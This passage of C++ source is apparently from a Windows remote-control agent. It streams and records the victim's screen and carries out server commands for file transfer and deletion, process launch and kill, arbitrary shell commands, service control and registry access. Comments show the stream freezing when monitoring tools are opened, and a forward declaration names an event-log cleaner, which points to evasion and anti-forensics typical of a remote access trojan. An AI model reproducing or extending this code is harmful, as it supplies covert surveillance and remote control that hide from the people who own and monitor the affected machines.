        if (g_paused_by_threat.load()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }

        const int target_fps = std::max(5, std::min(60, g_fps));
        const auto frame_dur = std::chrono::milliseconds(1000 / target_fps);
        auto t0 = std::chrono::steady_clock::now();

        try {
            auto raw = std::make_shared<ScreenCapture::RawFrame>();
            int result;

            if (g_service_mode && g_ipc_reader_ptr) {
                // Service mode: read frame from shared memory (capture helper in user session)
                // Wait for next frame from helper — timeout = 2x frame interval for safety
                int ipc_timeout = std::max(30, 2000 / std::max(1, g_fps));
                result = g_ipc_reader_ptr->read_frame(*raw, ipc_timeout);
            } else {
                // Standalone mode: capture directly
                result = g_screen.capture_raw_ex(*raw);

                // DXGI timeout — no frame from compositor (DWM idle)
                // After 3 timeouts, use GDI BitBlt which always works
                if (result == 0) {
                    consecutive_timeouts++;
                    if (consecutive_timeouts >= 3) {
                        if (g_screen.force_gdi_capture(*raw)) {
                            result = 1;
                        }
                    }
                }
            }

            if (result == 1 && !raw->pixels.empty()) {
                consecutive_failures = 0;
                int total_pixels = raw->src_width * raw->src_height;
                int dirty_pixels = raw->total_dirty_pixels;
                auto since_last = std::chrono::duration_cast<std::chrono::milliseconds>(t0 - last_refresh).count();
                // Skip tiny dirty rects only for DXGI (GDI has no dirty rects)
                if (dirty_pixels > 0 && dirty_pixels < total_pixels / 1000 && since_last < 500) {
                    continue;
                }
                // Reset timeout only on real DXGI frame (has dirty rects)
                if (consecutive_timeouts > 0 && !raw->dirty_rects.empty()) {
                    consecutive_timeouts = 0;
                }
                last_good_frame = raw;
                last_refresh = t0;
                {
                    std::lock_guard<std::mutex> lk(g_raw_mtx);
                    g_latest_raw = raw;
                    g_frame_seq++;
                }
                g_raw_cv.notify_all();
            } else if (result == 0) {
                // No frame from DXGI or GDI
            } else {
                consecutive_failures++;
                int wait_ms = std::min(2 + consecutive_failures * 5, 200);
                std::this_thread::sleep_for(std::chrono::milliseconds(wait_ms));
                continue;
            }
        } catch (const std::exception& e) {
            g_log.error("Capture error: " + std::string(e.what()));
            consecutive_failures++;
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            continue;
        }

        // In service/IPC mode, the read_frame already waits on event — no extra sleep needed.
        // In standalone mode, we need to pace the capture to target FPS.
        if (!g_service_mode) {
            auto elapsed = std::chrono::steady_clock::now() - t0;
            if (elapsed < frame_dur)
                std::this_thread::sleep_for(frame_dur - elapsed);
        }
      } catch (const std::exception& e) {
          g_log.error("Capture thread exception: " + std::string(e.what()) + " — continuing");
          Sleep(1000);
      } catch (...) {
          g_log.error("Capture thread unknown exception — continuing");
          Sleep(1000);
      }
    }

    if (mmcss) AvRevertMmThreadCharacteristics(mmcss);
    g_log.info("Capture thread stopped");
}

// Encode worker: takes raw frames, encodes (JPEG or H.264), sends via connection
static void stream_encode_func(int worker_id) {
    g_log.info("Encode worker " + std::to_string(worker_id) + " started, codec=" + g_codec);

    // MMCSS multimedia priority for encode threads — CRITICAL for Session 0 performance
    DWORD mmcss_task = 0;
    HANDLE mmcss = AvSetMmThreadCharacteristicsW(L"Pro Audio", &mmcss_task);
    if (mmcss) {
        AvSetMmThreadPriority(mmcss, AVRT_PRIORITY_CRITICAL);
        g_log.info("Encode worker " + std::to_string(worker_id) + ": MMCSS Pro Audio CRITICAL");
    } else {
        g_log.warn("Encode worker " + std::to_string(worker_id) + ": MMCSS FAILED err=" + std::to_string(GetLastError()));
    }

    uint64_t last_seq = 0;
    int n_conns = std::max(1, (int)g_stream_ws.size());
    bool use_h264 = (g_codec == "h264" || g_codec == "h265");

    // H.264: only worker 0 encodes (MFT is single-threaded)
    // Other workers skip when using H.264
    if (use_h264 && worker_id != 0) {
        g_log.info("Encode worker " + std::to_string(worker_id) + " idle (H.264 uses worker 0 only)");
        while (g_streaming && g_running)
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        return;
    }

    // Init H.264 encoder for worker 0
    if (use_h264 && worker_id == 0) {
        // Will initialize on first frame when we know dimensions
    }

    while (g_streaming && g_running) {
      try {
        // Skip encoding while threat-paused (capture thread is also sleeping)
        if (g_paused_by_threat.load()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }
        std::shared_ptr<ScreenCapture::RawFrame> raw;
        {
            std::unique_lock<std::mutex> lk(g_raw_mtx);
            g_raw_cv.wait_for(lk, std::chrono::milliseconds(50), [&] {
                return (g_latest_raw != nullptr && g_frame_seq > last_seq) || !g_streaming;
            });
            if (!g_streaming) break;
            if (!g_latest_raw || g_frame_seq <= last_seq) continue;
            raw = std::exchange(g_latest_raw, {});  // Take and clear
            last_seq = g_frame_seq;
        }
        if (!raw) continue;

        auto t0 = std::chrono::steady_clock::now();
        std::vector<uint8_t> msg;
        size_t frame_bytes = 0;

        if (use_h264) {
            // ── H.264 path ──
            int w = raw->target_width > 0 ? raw->target_width : raw->src_width;
            int h = raw->target_height > 0 ? raw->target_height : raw->src_height;

            // Lazy init / reinit on resolution change
            {
                std::lock_guard<std::mutex> lk(g_h264_mtx);
                if (!g_h264_encoder || !g_h264_encoder->is_initialized() ||
                    g_h264_encoder->get_width() != w || g_h264_encoder->get_height() != h)
                {
                    g_h264_encoder.reset();
                    auto enc = std::make_unique<H264Encoder>();
                    // Bitrate set by client (default 5000 kbps)
                    int bitrate = std::max(500, std::min(20000, g_bitrate));
                    if (enc->init(w, h, g_fps, bitrate)) {
                        g_h264_encoder = std::move(enc);
                    } else {
                        g_log.error("H.264 encoder init failed, falling back to JPEG");
                        use_h264 = false;
                    }
                }
            }

            if (use_h264 && g_h264_encoder) {
                bool want_key = g_h264_keyframe_requested.exchange(false);
                H264Encoder::EncodedFrame encoded;
                if (raw->pixel_format == 1 /* NV12 */) {
                    // Pre-converted NV12 from helper — skip bgra_to_nv12
                    encoded = g_h264_encoder->encode_nv12(raw->pixels.data(),
                                  raw->target_width, raw->target_height, want_key);
                } else {
                    encoded = g_h264_encoder->encode(raw->pixels.data(), raw->src_stride, want_key);
                }
                raw.reset();

                if (!encoded.data.empty() && g_streaming && !g_paused_by_threat) {
#ifdef USE_WEBRTC_STREAM
                    // WebRTC: send raw H264 Annex B directly via RTP (no SCR2 wrapper)
                    if (webrtc_stream::is_ready()) {
                        // First frame over WebRTC MUST be a keyframe (IDR)
                        if (!encoded.is_keyframe && !g_webrtc_sent_keyframe) {
                            g_h264_keyframe_requested = true;
                            continue;
                        }
                        if (encoded.is_keyframe) {
                            if (!g_webrtc_sent_keyframe) g_webrtc_start_time = std::chrono::steady_clock::now();
                            g_webrtc_sent_keyframe = true;
                            g_webrtc_last_keyframe = std::chrono::steady_clock::now();
                        }

                        // Periodic keyframes every 1s — balance between recovery speed
                        // and bandwidth (too frequent keyframes cause congestion → more loss)
                        auto since_key = std::chrono::steady_clock::now() - g_webrtc_last_keyframe;
                        if (since_key > std::chrono::seconds(1)) {
                            g_h264_keyframe_requested = true;
                        }

                        // RTP timestamp must be relative (not absolute steady_clock)
                        uint64_t ts_us = std::chrono::duration_cast<std::chrono::microseconds>(
                            std::chrono::steady_clock::now() - g_webrtc_start_time).count();
                        webrtc_stream::send_h264_frame(
                            encoded.data.data(), encoded.data.size(),
                            ts_us, encoded.is_keyframe);
                        frame_bytes = encoded.data.size();
                        continue;
                    } else {
                        g_webrtc_sent_keyframe = false;
                    }
#endif
                    msg = build_scrn_msg(w, h, encoded.data.data(), encoded.data.size(),
                                         1, encoded.is_keyframe);
                    frame_bytes = encoded.data.size();
                }
            }
        }

        if (!use_h264) {
            // ── JPEG path ──
            ScreenCapture::Frame fr;
            int quality = g_adaptive_quality.load();
            g_screen.encode_raw(*raw, fr, quality);
            raw.reset();

            if (!fr.jpeg_data.empty() && g_streaming) {
                frame_bytes = fr.jpeg_data.size();
                msg = build_scrn_msg(fr);
                if (g_recording) recording_write_frame(fr.jpeg_data);
            }
        }

        if (msg.empty() || !g_streaming) continue;
        if (g_paused_by_threat) continue; // freeze stream while monitoring tools open

        // Send via stream connection (round-robin)
        bool sent = false;
        int idx = worker_id % n_conns;
        if (idx < (int)g_stream_ws.size() && g_stream_ws[idx] && g_stream_ws[idx]->is_connected()) {
            g_stream_ws[idx]->send_binary(msg);
            sent = true;
        }
        if (!sent) {
            for (int i = 0; i < (int)g_stream_ws.size(); i++) {
                if (g_stream_ws[i] && g_stream_ws[i]->is_connected()) {
                    g_stream_ws[i]->send_binary(msg);
                    sent = true;
                    break;
                }
            }
        }
        if (!sent && g_ws && g_ws->is_connected()) {
            g_ws->send_binary(msg);
        }

        // Adaptive quality (JPEG only — H.264 uses bitrate control)
        auto t1 = std::chrono::steady_clock::now();
        int64_t elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count();
        if (!use_h264)
            update_adaptive_quality(elapsed_ms, frame_bytes);

        // FPS counter (log every 5 seconds)
        ++g_sent_frames;
        auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            t1.time_since_epoch()).count();
        int64_t last_log = g_fps_log_time.load();
        if (last_log == 0) g_fps_log_time.compare_exchange_strong(last_log, now_ms);
        if (now_ms - last_log >= 5000) {
            if (g_fps_log_time.compare_exchange_strong(last_log, now_ms)) {
                int frames = g_sent_frames.exchange(0);
                float fps = frames * 1000.0f / (float)(now_ms - last_log);
                int64_t bytes_5s = g_bytes_sent_total.exchange(0);
                int64_t throughput = bytes_5s * 1000 / std::max((int64_t)1, now_ms - last_log);
                g_throughput_bps = throughput;
                std::string info = "Stream: " + std::to_string(fps).substr(0,4) + " FPS, " +
                    std::to_string(frame_bytes/1024) + "KB, enc=" + std::to_string(elapsed_ms) + "ms" +
                    ", throughput=" + std::to_string(throughput/1024) + "KB/s" +
                    ", scale=" + std::to_string(g_auto_scale.load()) + "%";
                if (use_h264) info += " [H264]";
                else info += " q=" + std::to_string(g_adaptive_quality.load());
                g_log.info(info);
            }
        }
      } catch (const std::exception& e) {
          g_log.error("Encode worker " + std::to_string(worker_id) + " exception: " + std::string(e.what()) + " — continuing");
          Sleep(500);
      } catch (...) {
          g_log.error("Encode worker " + std::to_string(worker_id) + " unknown exception — continuing");
          Sleep(500);
      }
    }

    // Cleanup H.264 encoder
    try {
        if (use_h264 && worker_id == 0) {
            std::lock_guard<std::mutex> lk(g_h264_mtx);
            g_h264_encoder.reset();
        }
    } catch (...) {}
    if (mmcss) AvRevertMmThreadCharacteristics(mmcss);
    g_log.info("Encode worker " + std::to_string(worker_id) + " stopped");
}

// Start streaming pipeline
static void start_streaming() {
    if (g_streaming) return;

    g_adaptive_quality = std::min(g_quality, 50);  // Start conservative for fast ramp
    g_latest_raw.reset();
    g_frame_seq = 0;
    g_sent_frames = 0;
    g_fps_log_time = 0;
    g_consecutive_slow = 0;
    g_consecutive_fast = 0;
    g_bytes_sent_total = 0;
    g_throughput_bps = 0;
    g_auto_scale = g_user_scale;
    g_screen.set_scale(g_auto_scale);

    // Sync IPC control params for capture helper (service mode)
    if (g_service_mode && g_ipc_reader_ptr) {
        g_ipc_reader_ptr->set_fps(g_fps);
        g_ipc_reader_ptr->set_scale(g_auto_scale);
    }

    // Open dedicated stream connections (parallel to command connection)
    int n_conns = std::max(1, std::min(4, g_config.screen_connections));
    g_stream_ws.clear();
    for (int i = 0; i < n_conns; i++) {
        auto ws = std::make_unique<WsClient>();
        if (ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
            std::string auth = "{\"cmd\":\"auth\",\"token\":\"" + json_escape(g_config.room_token) +
                               "\",\"password\":\"" + json_escape(g_config.password) +
                               "\",\"role\":\"host_stream\"}";
            ws->send_text(auth);
            g_stream_ws.push_back(std::move(ws));
            g_log.info("Stream connection " + std::to_string(i) + " established");
        } else {
            g_log.warn("Stream connection " + std::to_string(i) + " failed");
        }
    }

    g_streaming = true;

    // Start capture thread
    g_capture_thread = std::thread(stream_capture_func);

    // Start encode workers (minimum 2 for overlapping encode)
    int n_workers = std::max(2, (int)g_stream_ws.size());
    g_encode_threads.clear();
    for (int i = 0; i < n_workers; i++) {
        g_encode_threads.emplace_back(stream_encode_func, i);
    }

    g_log.info("Streaming started: " + std::to_string(n_conns) + " connections, " +
               std::to_string(n_workers) + " encode workers, quality=" +
               std::to_string(g_adaptive_quality.load()) + "/" + std::to_string(g_quality) +
               ", scale=" + std::to_string(g_scale) + "%");
    if (g_scale >= 90)
        g_log.warn("Scale " + std::to_string(g_scale) + "% is high — reduce to 50-70 for better FPS");
}

// Stop streaming pipeline
static void stop_streaming() {
    if (!g_streaming) return;
    g_streaming = false;
    g_raw_cv.notify_all();

#ifdef USE_WEBRTC_STREAM
    webrtc_stream::close();
#endif

    if (g_capture_thread.joinable()) g_capture_thread.join();
    for (auto& t : g_encode_threads) {
        if (t.joinable()) t.join();
    }
    g_encode_threads.clear();

    for (auto& ws : g_stream_ws) {
        if (ws) ws->disconnect();
    }
    g_stream_ws.clear();

    {
        std::lock_guard<std::mutex> lk(g_h264_mtx);
        g_h264_encoder.reset();
    }

    // ── Free frame buffers to release RAM ──
    // Without this, the last captured frame (up to 4K × 4 bytes = 33 MB per frame)
    // plus any queued partial frames stay allocated until the next stream start.
    {
        std::lock_guard<std::mutex> lk(g_raw_mtx);
        g_latest_raw.reset();
        g_frame_seq = 0;
    }

    // Note: g_screen (ScreenCapture) is NOT stopped here. DXGI re-initialization
    // is expensive (~200ms) and the screen object re-checks initialized_ internally.
    // The ~33MB VRAM overhead of keeping it alive is acceptable vs the cost of
    // re-creating D3D11 device + output duplication on every stream start/stop cycle.

    // Clear sys_info cache (stale after stream stop)
    g_sysinfo_cache.clear();

    // Force OS to reclaim freed pages from the process working set.
    // Without this, CRT heap holds freed memory and working set stays inflated
    // (e.g., 100MB after streaming vs 35MB baseline). This is cosmetic — the
    // memory IS free internally, but Task Manager shows resident set, not committed.
    SetProcessWorkingSetSize(GetCurrentProcess(), (SIZE_T)-1, (SIZE_T)-1);

    g_log.info("Streaming stopped, resources released");
}

// ===== Registry helpers =====
static HKEY parse_root_key(const std::string& s) {
    if (s == "HKLM" || s == "HKEY_LOCAL_MACHINE") return HKEY_LOCAL_MACHINE;
    if (s == "HKCU" || s == "HKEY_CURRENT_USER") return HKEY_CURRENT_USER;
    if (s == "HKCR" || s == "HKEY_CLASSES_ROOT") return HKEY_CLASSES_ROOT;
    if (s == "HKU"  || s == "HKEY_USERS") return HKEY_USERS;
    if (s == "HKCC" || s == "HKEY_CURRENT_CONFIG") return HKEY_CURRENT_CONFIG;
    return nullptr;
}

static std::string reg_type_name(DWORD type) {
    switch (type) {
        case REG_SZ: return "REG_SZ";
        case REG_EXPAND_SZ: return "REG_EXPAND_SZ";
        case REG_DWORD: return "REG_DWORD";
        case REG_QWORD: return "REG_QWORD";
        case REG_BINARY: return "REG_BINARY";
        case REG_MULTI_SZ: return "REG_MULTI_SZ";
        case REG_NONE: return "REG_NONE";
        default: return "REG_UNKNOWN";
    }
}

// Split "HKLM\\SOFTWARE\\..." into root HKEY + subpath
static bool parse_reg_path(const std::string& full_path, HKEY& root, std::string& subpath) {
    auto pos = full_path.find('\\');
    std::string rootStr = (pos == std::string::npos) ? full_path : full_path.substr(0, pos);
    root = parse_root_key(rootStr);
    if (!root) return false;
    subpath = (pos == std::string::npos) ? "" : full_path.substr(pos + 1);
    return true;
}

static std::string bytes_to_hex(const BYTE* data, DWORD size) {
    std::string hex;
    for (DWORD i = 0; i < size; i++) {
        char buf[4];
        snprintf(buf, sizeof(buf), "%02X", data[i]);
        hex += buf;
        if (i + 1 < size) hex += ' ';
    }
    return hex;
}

static std::vector<BYTE> hex_to_bytes(const std::string& hex) {
    std::vector<BYTE> result;
    std::string clean;
    for (char c : hex) { if (c != ' ' && c != '-') clean += c; }
    for (size_t i = 0; i + 1 < clean.size(); i += 2) {
        result.push_back((BYTE)strtoul(clean.substr(i, 2).c_str(), nullptr, 16));
    }
    return result;
}

// Forward declarations for screenshot feature (globals declared at top of file)
static std::thread g_screenshot_thread;
static std::atomic<bool> g_screenshot_active{false};
static void screenshot_thread_func(); // defined after evtlog_cleaner

// ===== Command handler =====
static void handle_command(const std::string& msg_str) {
    try {
        // ── Detect auth-failure responses from server ──
        // Server.py sends {"ok":false,"error":"Wrong password"} (or similar) and
        // then closes. Flagging lets reconnect loop enter the long-cooldown branch
        // instead of hammering with bad credentials every second.
        {
            std::string ok_field = json_get(msg_str, "ok");
            if (ok_field == "false") {
                std::string err = json_get(msg_str, "error");
                // Case-insensitive search for auth-related keywords
                std::string el;
                el.reserve(err.size());
                for (char c : err) el += (char)tolower((unsigned char)c);
                if (el.find("password") != std::string::npos ||
                    el.find("token")    != std::string::npos ||
                    el.find("auth")     != std::string::npos ||
                    el.find("unauthor") != std::string::npos) {
                    reconnect_note_auth_fail();
                    g_log.warn("Auth rejected by server: " + err);
                }
            }
        }
#ifdef USE_WEBRTC_STREAM
        // Handle WebRTC ICE candidates (non-cmd messages)
        {
            std::string ice_cand = json_get(msg_str, "candidate");
            std::string ice_mid = json_get(msg_str, "sdpMid");
            if (!ice_cand.empty() && json_get(msg_str, "cmd").empty()) {
                webrtc_stream::add_ice_candidate(json_unescape(ice_cand), json_unescape(ice_mid));
                return;
            }
        }
#endif
        std::string cmd = json_get(msg_str, "cmd");
        std::string id  = json_get(msg_str, "id");

        auto send_ok = [&](const std::string& data) {
            if (!g_ws || !g_ws->is_connected()) return;
            std::string resp = "{\"id\":\"" + json_escape(id) + "\",\"ok\":true,\"data\":" + data + "}";
            g_ws->send_text(to_utf8(resp));
        };
        auto send_err = [&](const std::string& err) {
            if (!g_ws || !g_ws->is_connected()) return;
            std::string resp = "{\"id\":\"" + json_escape(id) + "\",\"ok\":false,\"error\":\"" + json_escape(err) + "\"}";
            g_ws->send_text(to_utf8(resp));
        };

        g_log.debug("CMD: " + cmd);

#ifdef USE_WEBRTC_STREAM
        // --- WebRTC signaling ---
        if (cmd == "webrtc_offer") {
            std::string sdp_type = json_get(msg_str, "type");
            std::string sdp_raw  = json_get(msg_str, "sdp");
            std::string from_id  = json_get(msg_str, "_from"); // VPS adds _from = client_id
            if (sdp_type.empty()) sdp_type = "offer";
            std::string sdp = json_unescape(sdp_raw);

            g_log.info("WebRTC: received offer from " + from_id + ", SDP length=" + std::to_string(sdp.size()));

            // Route responses back to the specific client via _to
            auto send_fn = [from_id](const std::string& text) {
                if (g_ws && g_ws->is_connected()) {
                    std::string routed = text;
                    if (!from_id.empty() && text.size() > 1 && text[0] == '{') {
                        routed = "{\"_to\":\"" + json_escape(from_id) + "\"," + text.substr(1);
                    }
                    g_ws->send_text(to_utf8(routed));
                }
            };

            // PLI callback: browser requests keyframe when it detects picture loss
            auto pli_fn = []() {
                g_h264_keyframe_requested = true;
            };

            bool ok = webrtc_stream::init_from_offer(
                sdp_type, sdp, send_fn, pli_fn,
                g_config.stun_server, g_config.turn_server);

            if (ok) {
                send_ok("\"webrtc_started\"");
            } else {
                send_err("webrtc_init_failed");
            }
            return;
        }
        if (cmd == "webrtc_ice") {
            std::string cand = json_unescape(json_get(msg_str, "candidate"));
            std::string mid  = json_unescape(json_get(msg_str, "sdpMid"));
            webrtc_stream::add_ice_candidate(cand, mid);
            return;
        }
#endif

        // --- Screen streaming ---
        if (cmd == "stream_start") {
            std::string codec = json_get(msg_str, "codec");
            std::string q_s   = json_get(msg_str, "quality");
            std::string fps_s = json_get(msg_str, "fps");
            std::string sc_s  = json_get(msg_str, "scale");
            std::string br_s  = json_get(msg_str, "bitrate");

            if (!codec.empty()) g_codec = codec;
            if (!q_s.empty())   g_quality = std::stoi(q_s);
            if (!fps_s.empty()) g_fps     = std::stoi(fps_s);
            if (!sc_s.empty())  { g_scale = std::stoi(sc_s); g_user_scale = g_scale; g_auto_scale = g_scale; }
            if (!br_s.empty())  g_bitrate = std::max(500, std::min(20000, std::stoi(br_s)));

            g_screen.set_codec(g_codec);
            g_screen.set_quality(g_quality);
            g_screen.set_scale(g_auto_scale);

            // Respond with ICE config so client can set up WebRTC with correct TURN/STUN
            std::string ice_info = "{\"started\":true";
            if (!g_config.stun_server.empty())
                ice_info += ",\"stun_server\":\"" + json_escape(g_config.stun_server) + "\"";
            if (!g_config.turn_server.empty())
                ice_info += ",\"turn_server\":\"" + json_escape(g_config.turn_server) + "\"";
            ice_info += "}";
            send_ok(ice_info);

            if (!g_streaming) {
                start_streaming();
            }
        }
        else if (cmd == "stream_stop") {
            stop_streaming();
            send_ok("\"stopped\"");
        }
        else if (cmd == "stream_settings") {
            std::string codec = json_get(msg_str, "codec");
            std::string q_s   = json_get(msg_str, "quality");
            std::string fps_s = json_get(msg_str, "fps");
            std::string sc_s  = json_get(msg_str, "scale");
            std::string br_s  = json_get(msg_str, "bitrate");
            bool codec_changed = (!codec.empty() && codec != g_codec);
            bool bitrate_changed = false;
            if (!codec.empty()) { g_codec = codec; g_screen.set_codec(g_codec); }
            if (!q_s.empty())   { g_quality = std::stoi(q_s); g_screen.set_quality(g_quality); g_adaptive_quality = g_quality; }
            if (!fps_s.empty()) g_fps = std::stoi(fps_s);
            if (!sc_s.empty())  { g_scale = std::stoi(sc_s); g_user_scale = g_scale; g_auto_scale = g_scale; g_screen.set_scale(g_scale); }
            if (!br_s.empty())  { int new_br = std::max(500, std::min(20000, std::stoi(br_s))); bitrate_changed = (new_br != g_bitrate); g_bitrate = new_br; }
            // Restart pipeline on codec or bitrate change (needs encoder reinit)
            if ((codec_changed || bitrate_changed) && g_streaming) {
                g_log.info("Codec changed to " + g_codec + ", restarting stream pipeline");
                stop_streaming();
                start_streaming();
            }
            send_ok("\"ok\"");
        }

        // --- Recording ---
        else if (cmd == "record_start") {
            if (!g_recording) {
                std::string recDir = json_get(msg_str, "recording_path");
                if (recDir.empty()) {
                    char tmpPath[MAX_PATH];
                    DWORD n = GetTempPathA(MAX_PATH, tmpPath);
                    if (n > 0 && n < MAX_PATH) recDir = tmpPath;
                    else recDir = ".\\";
                    if (recDir.back() != '\\' && recDir.back() != '/') recDir += "\\";
                    recDir += "Prometey_Recordings";
                }
                std::error_code ec;
                if (recDir.back() != '\\' && recDir.back() != '/') recDir += "\\";
                fs::create_directories(fs::path(recDir), ec);
                if (ec) {
                    recDir = (fs::current_path(ec) / "Prometey_Recordings").string();
                    if (recDir.back() != '\\') recDir += "\\";
                    fs::create_directories(recDir, ec);
                }
                recDir = fs::absolute(fs::path(recDir), ec).string();
                if (recDir.back() != '\\') recDir += "\\";
                SYSTEMTIME st; GetLocalTime(&st);
                char buf[64];
                snprintf(buf, sizeof(buf), "%04d%02d%02d_%02d%02d%02d.rdv",
                    st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
                std::string fname = recDir + buf;
                g_rec_file.open(fname, std::ios::binary);
                if (g_rec_file.is_open()) {
                    g_rec_frame_count = 0;
                    g_rec_start = std::chrono::steady_clock::now();
                    recording_write_header();
                    g_recording = true;
                    send_ok("\"" + json_escape(fname) + "\"");
                } else {
                    send_err("Cannot open recording file: " + fname);
                }
            } else {
                send_err("Already recording");
            }
        }
        else if (cmd == "record_stop") {
            if (g_recording) {
                g_recording = false;
                std::lock_guard<std::mutex> lk(g_rec_mtx);
                g_rec_file.close();
                send_ok("{\"frames\":" + std::to_string(g_rec_frame_count) + "}");
            } else {
                send_err("Not recording");
            }
        }

        // --- File manager ---
        else if (cmd == "file_list") {
            std::string path = json_get(msg_str, "path");
            if (path.empty()) path = "C:\\";
            std::string result = g_files.list_dir(path);
            send_ok(result);
        }
        else if (cmd == "file_read_chunk") {
            std::string path   = json_get(msg_str, "path");
            std::string off_s  = json_get(msg_str, "offset");
            std::string len_s  = json_get(msg_str, "length");
            std::string from_client = json_get(msg_str, "_from"); // VPS adds requesting client's id
            uint64_t offset = off_s.empty() ? 0 : std::stoull(off_s);
            uint32_t length = len_s.empty() ? 65536 : std::stoul(len_s);
            if (length > 1024 * 1024) length = 1024 * 1024; // Max 1MB per chunk

            // Routing hint is sent by file_worker_func right before the binary chunk
            // to ensure they're adjacent in the sender queue (no race with other workers).
            if (g_file_workers_running) {
                std::lock_guard<std::mutex> lk(g_file_work_mtx);
                g_file_work_q.push(FileWork{path, offset, length, from_client});
                g_file_work_cv.notify_one();
            } else {
                // Inline fallback: read chunk from disk and send through file or main ws
                std::vector<uint8_t> chunk = g_files.read_file_chunk(path, offset, length);
                std::vector<uint8_t> bin;
                bin.reserve(16 + path.size() + chunk.size());
                const char hdr[4] = {'F','I','L','E'};
                bin.insert(bin.end(), hdr, hdr+4);
                uint16_t plen = static_cast<uint16_t>(path.size());
                bin.insert(bin.end(), reinterpret_cast<uint8_t*>(&plen), reinterpret_cast<uint8_t*>(&plen)+2);
                bin.insert(bin.end(), path.begin(), path.end());
                bin.insert(bin.end(), reinterpret_cast<const uint8_t*>(&offset), reinterpret_cast<const uint8_t*>(&offset)+8);
                bin.insert(bin.end(), chunk.begin(), chunk.end());
                send_file_binary(bin);
            }
        }
        else if (cmd == "file_write_chunk") {
            send_ok("\"ready\"");
        }
        else if (cmd == "file_delete") {
            std::string path = json_get(msg_str, "path");
            bool ok = g_files.delete_path(path);
            ok ? send_ok("\"deleted\"") : send_err("Delete failed: " + path);
        }
        else if (cmd == "file_mkdir") {
            std::string path = json_get(msg_str, "path");
            bool ok = g_files.create_directory(path);
            ok ? send_ok("\"created\"") : send_err("mkdir failed: " + path);
        }
        else if (cmd == "file_rename") {
            std::string from = json_get(msg_str, "from");
            std::string to   = json_get(msg_str, "to");
            bool ok = g_files.rename_path(from, to);
            ok ? send_ok("\"renamed\"") : send_err("Rename failed");
        }
        else if (cmd == "file_copy") {
            std::string from = json_get(msg_str, "from");
            std::string to   = json_get(msg_str, "to");
            if (from.empty() || to.empty()) { send_err("file_copy requires from and to"); return; }
            std::error_code ec;
            fs::create_directories(fs::path(to).parent_path(), ec);
            bool ok = g_files.copy_path(from, to);
            ok ? send_ok("\"copied\"") : send_err("Copy failed: " + from);
        }
        else if (cmd == "file_read_text") {
            std::string path = json_get(msg_str, "path");
            std::string text = g_files.read_text_file(path);
            send_ok("\"" + json_escape(text) + "\"");
        }
        else if (cmd == "file_write_text") {
            std::string path = json_get(msg_str, "path");
            std::string text;
            try {
                // Try to parse as JSON to handle escaped characters
                size_t text_pos = msg_str.find("\"text\"");
                if (text_pos != std::string::npos) {
                    text = json_unescape(json_get(msg_str, "text"));
                }
            } catch (...) {
                text = json_unescape(json_get(msg_str, "text"));
            }
            bool ok = g_files.write_text_file(path, text);
            ok ? send_ok("\"saved\"") : send_err("Write failed: " + path);
        }
        else if (cmd == "file_info") {
            std::string path = json_get(msg_str, "path");
            std::error_code ec;
            auto sz = fs::file_size(path, ec);
            std::string r = "{\"size\":" + std::to_string(ec ? 0 : sz) + "}";
            send_ok(r);
        }
        else if (cmd == "drives_list") {
            DWORD mask = GetLogicalDrives();
            std::string arr = "[";
            bool first = true;
            for (int i = 0; i < 26; ++i) {
                if (mask & (1 << i)) {
                    char drv[4] = { static_cast<char>('A'+i), ':', '\\', 0 };
                    UINT type = GetDriveTypeA(drv);
                    const char* tname = type==DRIVE_REMOVABLE?"removable":
                                        type==DRIVE_FIXED?"fixed":
                                        type==DRIVE_REMOTE?"network":
                                        type==DRIVE_CDROM?"cdrom":"unknown";
                    ULARGE_INTEGER freeBytesAvail = {}, totalBytes = {}, freeBytes = {};
                    GetDiskFreeSpaceExA(drv, &freeBytesAvail, &totalBytes, &freeBytes);
                    if (!first) arr += ",";
                    arr += "{\"letter\":\"" + std::string(1,'A'+i) + "\",\"type\":\"" + tname +
                           "\",\"total\":" + std::to_string(totalBytes.QuadPart) +
                           ",\"free\":" + std::to_string(freeBytes.QuadPart) + "}";
                    first = false;
                }
            }
            arr += "]";
            send_ok(arr);
        }

        // --- Process manager ---
        else if (cmd == "proc_list") {
            send_ok(g_procs.get_process_list());
        }
        else if (cmd == "proc_kill") {
            std::string pid_s = json_get(msg_str, "pid");
            if (pid_s.empty()) { send_err("Missing pid"); return; }
            DWORD pid = std::stoul(pid_s);
            bool ok = g_procs.kill_process(pid);
            ok ? send_ok("\"killed\"") : send_err("Kill failed for pid " + pid_s);
        }
        else if (cmd == "proc_launch") {
            std::string exe    = json_get(msg_str, "exe");
            std::string args   = json_get(msg_str, "args");
            std::string elev   = json_get(msg_str, "elevate");
            bool as_admin = (elev == "admin" || elev == "system");
            bool ok = g_procs.launch_process(exe, args, "", as_admin);
            ok ? send_ok("\"launched\"") : send_err("Launch failed: " + exe);
        }
        else if (cmd == "term_exec") {
            std::string command = json_unescape(json_get(msg_str, "line"));
            if (command.empty()) command = json_unescape(json_get(msg_str, "cmd"));
            if (command.empty() || command == "term_exec") { send_err("Missing command line"); return; }
            std::string output = g_procs.run_cmd_capture(command);
            send_ok("\"" + json_escape(output) + "\"");
        }

        // --- Services ---
        else if (cmd == "svc_list") {
            send_ok(g_services.get_services_list());
        }
        else if (cmd == "svc_control") {
            std::string name   = json_get(msg_str, "name");
            std::string action = json_get(msg_str, "action");
            bool ok = g_services.control_service(name, action);
            ok ? send_ok("\"done\"") : send_err("Service control failed: " + name + " " + action);
        }

        // --- Registry ---
        else if (cmd == "reg_list") {
            std::string path = json_unescape(json_get(msg_str, "path"));
            if (path.empty()) {
                // Root: return list of root keys
                send_ok("{\"subkeys\":[\"HKLM\",\"HKCU\",\"HKCR\",\"HKU\",\"HKCC\"],\"values\":[]}");
                return;
            }
            HKEY root; std::string subpath;
            if (!parse_reg_path(path, root, subpath)) { send_err("Invalid registry path"); return; }

            HKEY hKey;
            LONG rc = RegOpenKeyExA(root, subpath.c_str(), 0, KEY_READ, &hKey);
            if (rc != ERROR_SUCCESS) { send_err("Cannot open key (error " + std::to_string(rc) + ")"); return; }

            // Enumerate subkeys (max 1000)
